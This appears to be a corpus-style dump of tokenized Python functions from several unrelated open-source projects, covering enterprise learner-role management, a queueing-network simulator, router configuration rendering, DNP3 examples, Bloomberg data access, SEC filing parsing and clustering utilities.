def _assign_enterprise_role_to_users ( self , _get_batch_method , options , is_feature_role = False ) : role_name = options [ 'role' ] batch_limit = options [ 'batch_limit' ] batch_sleep = options [ 'batch_sleep' ] batch_offset = options [ 'batch_offset' ] current_batch_index = batch_offset users_batch = _get_batch_method ( batch_offset , batch_offset + batch_limit ) role_class = SystemWideEnterpriseRole role_assignment_class = SystemWideEnterpriseUserRoleAssignment if is_feature_role : role_class = EnterpriseFeatureRole role_assignment_class = EnterpriseFeatureUserRoleAssignment enterprise_role = role_class . objects . get ( name = role_name ) while users_batch . count ( ) > 0 : for index , user in enumerate ( users_batch ) : LOGGER . info ( 'Processing user with index %s and id %s' , current_batch_index + index , user . id ) role_assignment_class . objects . get_or_create ( user = user , role = enterprise_role ) sleep ( batch_sleep ) current_batch_index += len ( users_batch ) users_batch = _get_batch_method ( current_batch_index , current_batch_index + batch_limit )
def handle ( self , * args , * * options ) : LOGGER . info ( 'Starting assigning enterprise roles to users!' ) role = options [ 'role' ] if role == ENTERPRISE_ADMIN_ROLE : # Assign admin role to non-staff users with enterprise data api access. self . _assign_enterprise_role_to_users ( self . _get_enterprise_admin_users_batch , options ) elif role == ENTERPRISE_OPERATOR_ROLE : # Assign operator role to staff users with enterprise data api access. self . _assign_enterprise_role_to_users ( self . _get_enterprise_operator_users_batch , options ) elif role == ENTERPRISE_LEARNER_ROLE : # Assign enterprise learner role to enterprise customer users. self . _assign_enterprise_role_to_users ( self . _get_enterprise_customer_users_batch , options ) elif role == ENTERPRISE_ENROLLMENT_API_ADMIN_ROLE : # Assign enterprise enrollment api admin to non-staff users with enterprise data api access. self . _assign_enterprise_role_to_users ( self . _get_enterprise_enrollment_api_admin_users_batch , options , True ) elif role == ENTERPRISE_CATALOG_ADMIN_ROLE : # Assign enterprise catalog admin role to users with having credentials in catalog. self . _assign_enterprise_role_to_users ( self . _get_enterprise_catalog_admin_users_batch , options , True ) else : raise CommandError ( 'Please provide a valid role name. Supported roles are {admin} and {learner}' . format ( admin = ENTERPRISE_ADMIN_ROLE , learner = ENTERPRISE_LEARNER_ROLE ) ) LOGGER . info ( 'Successfully finished assigning enterprise roles to users!' )
def get_enterprise_customer_for_running_pipeline ( request , pipeline ) : # pylint: disable=invalid-name sso_provider_id = request . GET . get ( 'tpa_hint' ) if pipeline : sso_provider_id = Registry . get_from_pipeline ( pipeline ) . provider_id return get_enterprise_customer_for_sso ( sso_provider_id )
def _create_session ( self ) : session = requests . Session ( ) session . timeout = self . SESSION_TIMEOUT oauth_access_token , expires_at = SAPSuccessFactorsAPIClient . get_oauth_access_token ( self . enterprise_configuration . sapsf_base_url , self . enterprise_configuration . key , self . enterprise_configuration . secret , self . enterprise_configuration . sapsf_company_id , self . enterprise_configuration . sapsf_user_id , self . enterprise_configuration . user_type ) session . headers [ 'Authorization' ] = 'Bearer {}' . format ( oauth_access_token ) session . headers [ 'content-type' ] = 'application/json' self . session = session self . expires_at = expires_at
def _call_search_students_recursively ( self , sap_search_student_url , all_inactive_learners , page_size , start_at ) : search_student_paginated_url = '{sap_search_student_url}&{pagination_criterion}' . format ( sap_search_student_url = sap_search_student_url , pagination_criterion = '$count=true&$top={page_size}&$skip={start_at}' . format ( page_size = page_size , start_at = start_at , ) , ) try : response = self . session . get ( search_student_paginated_url ) sap_inactive_learners = response . json ( ) except ( ConnectionError , Timeout ) : LOGGER . warning ( 'Unable to fetch inactive learners from SAP searchStudent API with url ' '"{%s}".' , search_student_paginated_url , ) return None if 'error' in sap_inactive_learners : LOGGER . warning ( 'SAP searchStudent API for customer %s and base url %s returned response with ' 'error message "%s" and with error code "%s".' , self . enterprise_configuration . enterprise_customer . name , self . enterprise_configuration . sapsf_base_url , sap_inactive_learners [ 'error' ] . get ( 'message' ) , sap_inactive_learners [ 'error' ] . get ( 'code' ) , ) return None new_page_start_at = page_size + start_at all_inactive_learners += sap_inactive_learners [ 'value' ] if sap_inactive_learners [ '@odata.count' ] > new_page_start_at : return self . _call_search_students_recursively ( sap_search_student_url , all_inactive_learners , page_size = page_size , start_at = new_page_start_at , ) return all_inactive_learners
def filter_queryset ( self , request , queryset , view ) : if not request . user . is_staff : filter_kwargs = { view . USER_ID_FILTER : request . user . id } queryset = queryset . filter ( * * filter_kwargs ) return queryset
def filter_queryset ( self , request , queryset , view ) : if request . user . is_staff : email = request . query_params . get ( 'email' , None ) username = request . query_params . get ( 'username' , None ) query_parameters = { } if email : query_parameters . update ( email = email ) if username : query_parameters . update ( username = username ) if query_parameters : users = User . objects . filter ( * * query_parameters ) . values_list ( 'id' , flat = True ) queryset = queryset . filter ( user_id__in = users ) else : queryset = queryset . filter ( user_id = request . user . id ) return queryset
def handle_transmission_error ( self , learner_data , request_exception ) : try : sys_msg = request_exception . response . content except AttributeError : sys_msg = 'Not available' LOGGER . error ( ( 'Failed to send completion status call for enterprise enrollment %s' 'with payload %s' '\nError message: %s' '\nSystem message: %s' ) , learner_data . enterprise_course_enrollment_id , learner_data , str ( request_exception ) , sys_msg )
def validate_image_extension ( value ) : config = get_app_config ( ) ext = os . path . splitext ( value . name ) [ 1 ] if config and not ext . lower ( ) in config . valid_image_extensions : raise ValidationError ( _ ( "Unsupported file extension." ) )
def validate_image_size ( image ) : config = get_app_config ( ) valid_max_image_size_in_bytes = config . valid_max_image_size * 1024 if config and not image . size <= valid_max_image_size_in_bytes : raise ValidationError ( _ ( "The logo image file size must be less than or equal to %s KB." ) % config . valid_max_image_size )
def get_enterprise_customer_from_catalog_id ( catalog_id ) : try : return str ( EnterpriseCustomerCatalog . objects . get ( pk = catalog_id ) . enterprise_customer . uuid ) except EnterpriseCustomerCatalog . DoesNotExist : return None
def get_requirements ( requirements_file ) : lines = open ( requirements_file ) . readlines ( ) dependencies = [ ] dependency_links = [ ] for line in lines : package = line . strip ( ) if package . startswith ( '#' ) : # Skip pure comment lines continue if any ( package . startswith ( prefix ) for prefix in VCS_PREFIXES ) : # VCS reference for dev purposes, expect a trailing comment # with the normal requirement package_link , __ , package = package . rpartition ( '#' ) # Remove -e <version_control> string package_link = re . sub ( r'(.*)(?P<dependency_link>https?.*$)' , r'\g<dependency_link>' , package_link ) package = re . sub ( r'(egg=)?(?P<package_name>.*)==.*$' , r'\g<package_name>' , package ) package_version = re . sub ( r'.*[^=]==' , '' , line . strip ( ) ) if package : dependency_links . append ( '{package_link}#egg={package}-{package_version}' . format ( package_link = package_link , package = package , package_version = package_version , ) ) else : # Ignore any trailing comment package , __ , __ = package . partition ( '#' ) # Remove any whitespace and assume non-empty results are dependencies package = package . strip ( ) if package : dependencies . append ( package ) return dependencies , dependency_links
def transmit_learner_data ( self , user ) : exporter = self . get_learner_data_exporter ( user ) transmitter = self . get_learner_data_transmitter ( ) transmitter . transmit ( exporter )
def transmit_content_metadata ( self , user ) : exporter = self . get_content_metadata_exporter ( user ) transmitter = self . get_content_metadata_transmitter ( ) transmitter . transmit ( exporter . export ( ) )
def get ( self , request , template_id , view_type ) : template = get_object_or_404 ( EnrollmentNotificationEmailTemplate , pk = template_id ) if view_type not in self . view_type_contexts : return HttpResponse ( status = 404 ) base_context = self . view_type_contexts [ view_type ] . copy ( ) base_context . update ( { 'user_name' : self . get_user_name ( request ) } ) return HttpResponse ( template . render_html_template ( base_context ) , content_type = 'text/html' )
def _build_admin_context ( request , customer ) : opts = customer . _meta codename = get_permission_codename ( 'change' , opts ) has_change_permission = request . user . has_perm ( '%s.%s' % ( opts . app_label , codename ) ) return { 'has_change_permission' : has_change_permission , 'opts' : opts }
def _build_context ( self , request , enterprise_customer_uuid ) : enterprise_customer = EnterpriseCustomer . objects . get ( uuid = enterprise_customer_uuid ) # pylint: disable=no-member context = { self . ContextParameters . ENTERPRISE_CUSTOMER : enterprise_customer , } context . update ( admin . site . each_context ( request ) ) context . update ( self . _build_admin_context ( request , enterprise_customer ) ) return context
def _build_context ( self , request , customer_uuid ) : # TODO: pylint acts stupid - find a way around it without suppressing enterprise_customer = EnterpriseCustomer . objects . get ( uuid = customer_uuid ) # pylint: disable=no-member search_keyword = self . get_search_keyword ( request ) linked_learners = self . get_enterprise_customer_user_queryset ( request , search_keyword , customer_uuid ) pending_linked_learners = self . get_pending_users_queryset ( search_keyword , customer_uuid ) context = { self . ContextParameters . ENTERPRISE_CUSTOMER : enterprise_customer , self . ContextParameters . PENDING_LEARNERS : pending_linked_learners , self . ContextParameters . LEARNERS : linked_learners , self . ContextParameters . SEARCH_KEYWORD : search_keyword or '' , self . ContextParameters . ENROLLMENT_URL : settings . LMS_ENROLLMENT_API_PATH , } context . update ( admin . site . each_context ( request ) ) context . update ( self . _build_admin_context ( request , enterprise_customer ) ) return context
def from_children ( cls , program_uuid , * children ) : if not children or any ( child is None for child in children ) : return None granted = all ( ( child . granted for child in children ) ) exists = any ( ( child . exists for child in children ) ) usernames = set ( [ child . username for child in children ] ) enterprises = set ( [ child . enterprise_customer for child in children ] ) if not len ( usernames ) == len ( enterprises ) == 1 : raise InvalidProxyConsent ( 'Children used to create a bulk proxy consent object must ' 'share a single common username and EnterpriseCustomer.' ) username = children [ 0 ] . username enterprise_customer = children [ 0 ] . enterprise_customer return cls ( enterprise_customer = enterprise_customer , username = username , program_uuid = program_uuid , exists = exists , granted = granted , child_consents = children )
def create_roles ( apps , schema_editor ) : EnterpriseFeatureRole = apps . get_model ( 'enterprise' , 'EnterpriseFeatureRole' ) EnterpriseFeatureRole . objects . update_or_create ( name = ENTERPRISE_CATALOG_ADMIN_ROLE ) EnterpriseFeatureRole . objects . update_or_create ( name = ENTERPRISE_DASHBOARD_ADMIN_ROLE ) EnterpriseFeatureRole . objects . update_or_create ( name = ENTERPRISE_ENROLLMENT_API_ADMIN_ROLE )
def delete_roles ( apps , schema_editor ) : EnterpriseFeatureRole = apps . get_model ( 'enterprise' , 'EnterpriseFeatureRole' ) EnterpriseFeatureRole . objects . filter ( name__in = [ ENTERPRISE_CATALOG_ADMIN_ROLE , ENTERPRISE_DASHBOARD_ADMIN_ROLE , ENTERPRISE_ENROLLMENT_API_ADMIN_ROLE ] ) . delete ( )
def track_enrollment ( pathway , user_id , course_run_id , url_path = None ) : track_event ( user_id , 'edx.bi.user.enterprise.onboarding' , { 'pathway' : pathway , 'url_path' : url_path , 'course_run_id' : course_run_id , } )
def is_course_run_upgradeable ( course_run ) : now = datetime . datetime . now ( pytz . UTC ) for seat in course_run . get ( 'seats' , [ ] ) : if seat . get ( 'type' ) == 'verified' : upgrade_deadline = parse_datetime_handle_invalid ( seat . get ( 'upgrade_deadline' ) ) return not upgrade_deadline or upgrade_deadline > now return False
def get_closest_course_run ( course_runs ) : if len ( course_runs ) == 1 : return course_runs [ 0 ] now = datetime . datetime . now ( pytz . UTC ) # course runs with no start date should be considered last. never = now - datetime . timedelta ( days = 3650 ) return min ( course_runs , key = lambda x : abs ( get_course_run_start ( x , never ) - now ) )
def parse_course_key ( course_identifier ) : try : course_run_key = CourseKey . from_string ( course_identifier ) except InvalidKeyError : # Assume we already have a course key. return course_identifier return quote_plus ( ' ' . join ( [ course_run_key . org , course_run_key . course ] ) )
def create_roles ( apps , schema_editor ) : SystemWideEnterpriseRole = apps . get_model ( 'enterprise' , 'SystemWideEnterpriseRole' ) SystemWideEnterpriseRole . objects . update_or_create ( name = ENTERPRISE_OPERATOR_ROLE )
def delete_roles ( apps , schema_editor ) : SystemWideEnterpriseRole = apps . get_model ( 'enterprise' , 'SystemWideEnterpriseRole' ) SystemWideEnterpriseRole . objects . filter ( name__in = [ ENTERPRISE_OPERATOR_ROLE ] ) . delete ( )
def lrs ( self ) : return RemoteLRS ( version = self . lrs_configuration . version , endpoint = self . lrs_configuration . endpoint , auth = self . lrs_configuration . authorization_header , )
def ecommerce_coupon_url ( self , instance ) : if not instance . entitlement_id : return "N/A" return format_html ( '<a href="{base_url}/coupons/{id}" target="_blank">View coupon "{id}" details</a>' , base_url = settings . ECOMMERCE_PUBLIC_URL_ROOT , id = instance . entitlement_id )
def dropHistoricalTable ( apps , schema_editor ) : table_name = 'sap_success_factors_historicalsapsuccessfactorsenterprisecus80ad' if table_name in connection . introspection . table_names ( ) : migrations . DeleteModel ( name = table_name , )
def get_clear_catalog_id_action ( description = None ) : description = description or _ ( "Unlink selected objects from existing course catalogs" ) def clear_catalog_id ( modeladmin , request , queryset ) : # pylint: disable=unused-argument queryset . update ( catalog = None ) clear_catalog_id . short_description = description return clear_catalog_id
def _calculate_distance ( latlon1 , latlon2 ) : lat1 , lon1 = latlon1 lat2 , lon2 = latlon2 dlon = lon2 - lon1 dlat = lat2 - lat1 R = 6371 # radius of the earth in kilometers a = np . sin ( dlat / 2 ) ** 2 + np . cos ( lat1 ) * np . cos ( lat2 ) * ( np . sin ( dlon / 2 ) ) ** 2 c = 2 * np . pi * R * np . arctan2 ( np . sqrt ( a ) , np . sqrt ( 1 - a ) ) / 180 return c
def _matrix2dict ( matrix , etype = False ) : n = len ( matrix ) adj = { k : { } for k in range ( n ) } for k in range ( n ) : for j in range ( n ) : if matrix [ k , j ] != 0 : adj [ k ] [ j ] = { } if not etype else matrix [ k , j ] return adj
def _get_queues ( g , queues , edge , edge_type ) : INT = numbers . Integral if isinstance ( queues , INT ) : queues = [ queues ] elif queues is None : if edge is not None : if isinstance ( edge , tuple ) : if isinstance ( edge [ 0 ] , INT ) and isinstance ( edge [ 1 ] , INT ) : queues = [ g . edge_index [ edge ] ] elif isinstance ( edge [ 0 ] , collections . Iterable ) : if np . array ( [ len ( e ) == 2 for e in edge ] ) . all ( ) : queues = [ g . edge_index [ e ] for e in edge ] else : queues = [ g . edge_index [ edge ] ] elif edge_type is not None : if isinstance ( edge_type , collections . Iterable ) : edge_type = set ( edge_type ) else : edge_type = set ( [ edge_type ] ) tmp = [ ] for e in g . edges ( ) : if g . ep ( e , 'edge_type' ) in edge_type : tmp . append ( g . edge_index [ e ] ) queues = np . array ( tmp , int ) if queues is None : queues = range ( g . number_of_edges ( ) ) return queues
def copy ( self ) : net = QueueNetwork ( None ) net . g = self . g . copy ( ) net . max_agents = copy . deepcopy ( self . max_agents ) net . nV = copy . deepcopy ( self . nV ) net . nE = copy . deepcopy ( self . nE ) net . num_agents = copy . deepcopy ( self . num_agents ) net . num_events = copy . deepcopy ( self . num_events ) net . _t = copy . deepcopy ( self . _t ) net . _initialized = copy . deepcopy ( self . _initialized ) net . _prev_edge = copy . deepcopy ( self . _prev_edge ) net . _blocking = copy . deepcopy ( self . _blocking ) net . colors = copy . deepcopy ( self . colors ) net . out_edges = copy . deepcopy ( self . out_edges ) net . in_edges = copy . deepcopy ( self . in_edges ) net . edge2queue = copy . deepcopy ( self . edge2queue ) net . _route_probs = copy . deepcopy ( self . _route_probs ) if net . _initialized : keys = [ q . _key ( ) for q in net . edge2queue if q . _time < np . infty ] net . _fancy_heap = PriorityQueue ( keys , net . nE ) return net
def reset_colors ( self ) : for k , e in enumerate ( self . g . edges ( ) ) : self . g . set_ep ( e , 'edge_color' , self . edge2queue [ k ] . colors [ 'edge_color' ] ) for v in self . g . nodes ( ) : self . g . set_vp ( v , 'vertex_fill_color' , self . colors [ 'vertex_fill_color' ] )
def strip_comment_marker ( text ) : lines = [ ] for line in text . splitlines ( ) : lines . append ( line . lstrip ( '#' ) ) text = textwrap . dedent ( '\n' . join ( lines ) ) return text
def get_class_traits ( klass ) : # FIXME: gracefully handle errors here or in the caller? source = inspect . getsource ( klass ) cb = CommentBlocker ( ) cb . process_file ( StringIO ( source ) ) mod_ast = compiler . parse ( source ) class_ast = mod_ast . node . nodes [ 0 ] for node in class_ast . code . nodes : # FIXME: handle other kinds of assignments? if isinstance ( node , compiler . ast . Assign ) : name = node . nodes [ 0 ] . name rhs = unparse ( node . expr ) . strip ( ) doc = strip_comment_marker ( cb . search_for_comment ( node . lineno , default = '' ) ) yield name , rhs , doc
def add ( self , string , start , end , line ) : if string . strip ( ) : # Only add if not entirely whitespace. self . start_lineno = min ( self . start_lineno , start [ 0 ] ) self . end_lineno = max ( self . end_lineno , end [ 0 ] )
def process_file ( self , file ) : if sys . version_info [ 0 ] >= 3 : nxt = file . __next__ else : nxt = file . next for token in tokenize . generate_tokens ( nxt ) : self . process_token ( * token ) self . make_index ( )
def process_token ( self , kind , string , start , end , line ) : if self . current_block . is_comment : if kind == tokenize . COMMENT : self . current_block . add ( string , start , end , line ) else : self . new_noncomment ( start [ 0 ] , end [ 0 ] ) else : if kind == tokenize . COMMENT : self . new_comment ( string , start , end , line ) else : self . current_block . add ( string , start , end , line )
def new_noncomment ( self , start_lineno , end_lineno ) : block = NonComment ( start_lineno , end_lineno ) self . blocks . append ( block ) self . current_block = block
def _load ( self , config ) : if isinstance ( config , six . string_types ) : try : config = json . loads ( config ) except ValueError : pass if not isinstance ( config , dict ) : raise TypeError ( 'config block must be an istance ' 'of dict or a valid NetJSON string' ) return config
def _merge_config ( self , config , templates ) : if not templates : return config # type check if not isinstance ( templates , list ) : raise TypeError ( 'templates argument must be an instance of list' ) # merge templates with main configuration result = { } config_list = templates + [ config ] for merging in config_list : result = merge_config ( result , self . _load ( merging ) , self . list_identifiers ) return result
def _get_install_context ( self ) : config = self . config # layer2 VPN list l2vpn = [ ] for vpn in self . config . get ( 'openvpn' , [ ] ) : if vpn . get ( 'dev_type' ) != 'tap' : continue tap = vpn . copy ( ) l2vpn . append ( tap ) # bridge list bridges = [ ] for interface in self . config . get ( 'interfaces' , [ ] ) : if interface [ 'type' ] != 'bridge' : continue bridge = interface . copy ( ) if bridge . get ( 'addresses' ) : bridge [ 'proto' ] = interface [ 'addresses' ] [ 0 ] . get ( 'proto' ) bridge [ 'ip' ] = interface [ 'addresses' ] [ 0 ] . get ( 'address' ) bridges . append ( bridge ) # crontabs present? cron = False for _file in config . get ( 'files' , [ ] ) : path = _file [ 'path' ] if path . startswith ( '/crontabs' ) or path . startswith ( 'crontabs' ) : cron = True break # return context return dict ( hostname = config [ 'general' ] [ 'hostname' ] , # hostname is required l2vpn = l2vpn , bridges = bridges , radios = config . get ( 'radios' , [ ] ) , # radios might be empty cron = cron )
def _add_install ( self , context ) : contents = self . _render_template ( 'install.sh' , context ) self . config . setdefault ( 'files' , [ ] ) # file list might be empty # add install.sh to list of included files self . _add_unique_file ( { "path" : "/install.sh" , "contents" : contents , "mode" : "755" } )
def _add_uninstall ( self , context ) : contents = self . _render_template ( 'uninstall.sh' , context ) self . config . setdefault ( 'files' , [ ] ) # file list might be empty # add uninstall.sh to list of included files self . _add_unique_file ( { "path" : "/uninstall.sh" , "contents" : contents , "mode" : "755" } )
def _add_tc_script ( self ) : # fill context context = dict ( tc_options = self . config . get ( 'tc_options' , [ ] ) ) # import pdb; pdb.set_trace() contents = self . _render_template ( 'tc_script.sh' , context ) self . config . setdefault ( 'files' , [ ] ) # file list might be empty # add tc_script.sh to list of included files self . _add_unique_file ( { "path" : "/tc_script.sh" , "contents" : contents , "mode" : "755" } )
def render ( self ) : # get jinja2 template template_name = '{0}.jinja2' . format ( self . get_name ( ) ) template = self . template_env . get_template ( template_name ) # render template and cleanup context = getattr ( self . backend , 'intermediate_data' , { } ) output = template . render ( data = context ) return self . cleanup ( output )
def __intermediate_address ( self , address ) : for key in self . _address_keys : if key in address : del address [ key ] return address
def __intermediate_proto ( self , interface , address ) : # proto defaults to static address_proto = address . pop ( 'proto' , 'static' ) if 'proto' not in interface : return address_proto else : # allow override on interface level return interface . pop ( 'proto' )
def __intermediate_dns_servers ( self , uci , address ) : # allow override if 'dns' in uci : return uci [ 'dns' ] # ignore if using DHCP or if "proto" is none if address [ 'proto' ] in [ 'dhcp' , 'dhcpv6' , 'none' ] : return None dns = self . netjson . get ( 'dns_servers' , None ) if dns : return ' ' . join ( dns )
def __intermediate_dns_search ( self , uci , address ) : # allow override if 'dns_search' in uci : return uci [ 'dns_search' ] # ignore if "proto" is none if address [ 'proto' ] == 'none' : return None dns_search = self . netjson . get ( 'dns_search' , None ) if dns_search : return ' ' . join ( dns_search )
def __intermediate_htmode ( self , radio ) : protocol = radio . pop ( 'protocol' ) channel_width = radio . pop ( 'channel_width' ) # allow overriding htmode if 'htmode' in radio : return radio [ 'htmode' ] if protocol == '802.11n' : return 'HT{0}' . format ( channel_width ) elif protocol == '802.11ac' : return 'VHT{0}' . format ( channel_width ) # disables n return 'NONE'
def __netjson_protocol ( self , radio ) : htmode = radio . get ( 'htmode' ) hwmode = radio . get ( 'hwmode' , None ) if htmode . startswith ( 'HT' ) : return '802.11n' elif htmode . startswith ( 'VHT' ) : return '802.11ac' return '802.{0}' . format ( hwmode )
def __netjson_channel_width ( self , radio ) : htmode = radio . pop ( 'htmode' ) if htmode == 'NONE' : return 20 channel_width = htmode . replace ( 'VHT' , '' ) . replace ( 'HT' , '' ) # we need to override htmode if '+' in channel_width or '-' in channel_width : radio [ 'htmode' ] = htmode channel_width = channel_width [ 0 : - 1 ] return int ( channel_width )
def get_install_requires ( ) : requirements = [ ] for line in open ( 'requirements.txt' ) . readlines ( ) : # skip to next iteration if comment or empty line if line . startswith ( '#' ) or line == '' or line . startswith ( 'http' ) or line . startswith ( 'git' ) : continue # add line to requirements requirements . append ( line . replace ( '\n' , '' ) ) # add py2-ipaddress if python2 if sys . version_info . major < 3 : requirements . append ( 'py2-ipaddress' ) return requirements
def fact ( self , name ) : facts = self . facts ( name = name ) return next ( fact for fact in facts )
def main ( ) : # app = MyMaster() app = MyMaster ( log_handler = MyLogger ( ) , listener = AppChannelListener ( ) , soe_handler = SOEHandler ( ) , master_application = MasterApplication ( ) ) _log . debug ( 'Initialization complete. In command loop.' ) # Ad-hoc tests can be performed at this point. See master_cmd.py for examples. app . shutdown ( ) _log . debug ( 'Exiting.' ) exit ( )
def main ( ) : app = OutstationApplication ( ) _log . debug ( 'Initialization complete. In command loop.' ) # Ad-hoc tests can be inserted here if desired. See outstation_cmd.py for examples. app . shutdown ( ) _log . debug ( 'Exiting.' ) exit ( )
def configure_stack ( ) : stack_config = asiodnp3 . OutstationStackConfig ( opendnp3 . DatabaseSizes . AllTypes ( 10 ) ) stack_config . outstation . eventBufferConfig = opendnp3 . EventBufferConfig ( ) . AllTypes ( 10 ) stack_config . outstation . params . allowUnsolicited = True stack_config . link . LocalAddr = 10 stack_config . link . RemoteAddr = 1 stack_config . link . KeepAliveTimeout = openpal . TimeDuration ( ) . Max ( ) return stack_config
def GetApplicationIIN ( self ) : application_iin = opendnp3 . ApplicationIIN ( ) application_iin . configCorrupt = False application_iin . deviceTrouble = False application_iin . localControl = False application_iin . needTime = False # Just for testing purposes, convert it to an IINField and display the contents of the two bytes. iin_field = application_iin . ToIIN ( ) _log . debug ( 'OutstationApplication.GetApplicationIIN: IINField LSB={}, MSB={}' . format ( iin_field . LSB , iin_field . MSB ) ) return application_iin
def delete_connection ( ) : if _CON_SYM_ in globals ( ) : con = globals ( ) . pop ( _CON_SYM_ ) if not getattr ( con , '_session' ) . start ( ) : con . stop ( )
def parse_markdown ( ) : readme_file = f'{PACKAGE_ROOT}/README.md' if path . exists ( readme_file ) : with open ( readme_file , 'r' , encoding = 'utf-8' ) as f : long_description = f . read ( ) return long_description
def parse_description ( markdown = True ) : if markdown : return parse_markdown ( ) try : from pypandoc import convert readme_file = f'{PACKAGE_ROOT}/docs/index.rst' if not path . exists ( readme_file ) : raise ImportError return convert ( readme_file , 'rst' ) except ImportError : return parse_markdown ( )
def _to_gen_ ( iterable ) : from collections import Iterable for elm in iterable : if isinstance ( elm , Iterable ) and not isinstance ( elm , ( str , bytes ) ) : yield from flatten ( elm ) else : yield elm
def missing_info ( * * kwargs ) -> str : func = kwargs . pop ( 'func' , 'unknown' ) if 'ticker' in kwargs : kwargs [ 'ticker' ] = kwargs [ 'ticker' ] . replace ( '/' , '_' ) info = utils . to_str ( kwargs , fmt = '{value}' , sep = '/' ) [ 1 : - 1 ] return f'{func}/{info}'
def update_missing ( * * kwargs ) : data_path = os . environ . get ( BBG_ROOT , '' ) . replace ( '\\' , '/' ) if not data_path : return if len ( kwargs ) == 0 : return log_path = f'{data_path}/Logs/{missing_info(**kwargs)}' cnt = len ( files . all_files ( log_path ) ) + 1 files . create_folder ( log_path ) open ( f'{log_path}/{cnt}.log' , 'a' ) . close ( )
def start ( self ) : # flush event queue in defensive way logger = _get_logger ( self . debug ) started = self . _session . start ( ) if started : ev = self . _session . nextEvent ( ) ev_name = _EVENT_DICT [ ev . eventType ( ) ] logger . info ( 'Event Type: {!r}' . format ( ev_name ) ) for msg in ev : logger . info ( 'Message Received:\n{}' . format ( msg ) ) if ev . eventType ( ) != blpapi . Event . SESSION_STATUS : raise RuntimeError ( 'Expected a "SESSION_STATUS" event but ' 'received a {!r}' . format ( ev_name ) ) ev = self . _session . nextEvent ( ) ev_name = _EVENT_DICT [ ev . eventType ( ) ] logger . info ( 'Event Type: {!r}' . format ( ev_name ) ) for msg in ev : logger . info ( 'Message Received:\n{}' . format ( msg ) ) if ev . eventType ( ) != blpapi . Event . SESSION_STATUS : raise RuntimeError ( 'Expected a "SESSION_STATUS" event but ' 'received a {!r}' . format ( ev_name ) ) else : ev = self . _session . nextEvent ( self . timeout ) if ev . eventType ( ) == blpapi . Event . SESSION_STATUS : for msg in ev : logger . warning ( 'Message Received:\n{}' . format ( msg ) ) raise ConnectionError ( 'Could not start blpapi.Session' ) self . _init_services ( ) return self
def _init_services ( self ) : logger = _get_logger ( self . debug ) # flush event queue in defensive way opened = self . _session . openService ( '//blp/refdata' ) ev = self . _session . nextEvent ( ) ev_name = _EVENT_DICT [ ev . eventType ( ) ] logger . info ( 'Event Type: {!r}' . format ( ev_name ) ) for msg in ev : logger . info ( 'Message Received:\n{}' . format ( msg ) ) if ev . eventType ( ) != blpapi . Event . SERVICE_STATUS : raise RuntimeError ( 'Expected a "SERVICE_STATUS" event but ' 'received a {!r}' . format ( ev_name ) ) if not opened : logger . warning ( 'Failed to open //blp/refdata' ) raise ConnectionError ( 'Could not open a //blp/refdata service' ) self . refDataService = self . _session . getService ( '//blp/refdata' ) opened = self . _session . openService ( '//blp/exrsvc' ) ev = self . _session . nextEvent ( ) ev_name = _EVENT_DICT [ ev . eventType ( ) ] logger . info ( 'Event Type: {!r}' . format ( ev_name ) ) for msg in ev : logger . info ( 'Message Received:\n{}' . format ( msg ) ) if ev . eventType ( ) != blpapi . Event . SERVICE_STATUS : raise RuntimeError ( 'Expected a "SERVICE_STATUS" event but ' 'received a {!r}' . format ( ev_name ) ) if not opened : logger . warning ( 'Failed to open //blp/exrsvc' ) raise ConnectionError ( 'Could not open a //blp/exrsvc service' ) self . exrService = self . _session . getService ( '//blp/exrsvc' ) return self
def _adjust_delay ( self , slot , response ) : if response . status in self . retry_http_codes : new_delay = max ( slot . delay , 1 ) * 4 new_delay = max ( new_delay , self . mindelay ) new_delay = min ( new_delay , self . maxdelay ) slot . delay = new_delay self . stats . inc_value ( 'delay_count' ) elif response . status == 200 : new_delay = max ( slot . delay / 2 , self . mindelay ) if new_delay < 0.01 : new_delay = 0 slot . delay = new_delay
def memberness ( context ) : if context : texts = context . xpath ( './/*[local-name()="explicitMember"]/text()' ) . extract ( ) text = str ( texts ) . lower ( ) if len ( texts ) > 1 : return 2 elif 'country' in text : return 2 elif 'member' not in text : return 0 elif 'successor' in text : # 'SuccessorMember' is a rare case that shouldn't be treated as member return 1 elif 'parent' in text : return 2 return 3
def parse_10qk ( self , response ) : loader = ReportItemLoader ( response = response ) item = loader . load_item ( ) if 'doc_type' in item : doc_type = item [ 'doc_type' ] if doc_type in ( '10-Q' , '10-K' ) : return item return None
def _find_lcs ( self , node , stringIdxs ) : nodes = [ self . _find_lcs ( n , stringIdxs ) for ( n , _ ) in node . transition_links if n . generalized_idxs . issuperset ( stringIdxs ) ] if nodes == [ ] : return node deepestNode = max ( nodes , key = lambda n : n . depth ) return deepestNode
def _generalized_word_starts ( self , xs ) : self . word_starts = [ ] i = 0 for n in range ( len ( xs ) ) : self . word_starts . append ( i ) i += len ( xs [ n ] ) + 1
def _edgeLabel ( self , node , parent ) : return self . word [ node . idx + parent . depth : node . idx + node . depth ]
def query ( self , i , j ) : if self . queries_cnt < self . max_queries_cnt : self . queries_cnt += 1 return self . labels [ i ] == self . labels [ j ] else : raise MaximumQueriesExceeded
def preprocess_constraints ( ml , cl , n ) : # Represent the graphs using adjacency-lists ml_graph , cl_graph = { } , { } for i in range ( n ) : ml_graph [ i ] = set ( ) cl_graph [ i ] = set ( ) def add_both ( d , i , j ) : d [ i ] . add ( j ) d [ j ] . add ( i ) for ( i , j ) in ml : ml_graph [ i ] . add ( j ) ml_graph [ j ] . add ( i ) for ( i , j ) in cl : cl_graph [ i ] . add ( j ) cl_graph [ j ] . add ( i ) def dfs ( i , graph , visited , component ) : visited [ i ] = True for j in graph [ i ] : if not visited [ j ] : dfs ( j , graph , visited , component ) component . append ( i ) # Run DFS from each node to get all the graph's components # and add an edge for each pair of nodes in the component (create a complete graph) # See http://www.techiedelight.com/transitive-closure-graph/ for more details visited = [ False ] * n neighborhoods = [ ] for i in range ( n ) : if not visited [ i ] and ml_graph [ i ] : component = [ ] dfs ( i , ml_graph , visited , component ) for x1 in component : for x2 in component : if x1 != x2 : ml_graph [ x1 ] . add ( x2 ) neighborhoods . append ( component ) for ( i , j ) in cl : for x in ml_graph [ i ] : add_both ( cl_graph , x , j ) for y in ml_graph [ j ] : add_both ( cl_graph , i , y ) for x in ml_graph [ i ] : for y in ml_graph [ j ] : add_both ( cl_graph , x , y ) for i in ml_graph : for j in ml_graph [ i ] : if j != i and j in cl_graph [ i ] : raise InconsistentConstraintsException ( 'Inconsistent constraints between {} and {}' . format ( i , j ) ) return ml_graph , cl_graph , neighborhoods
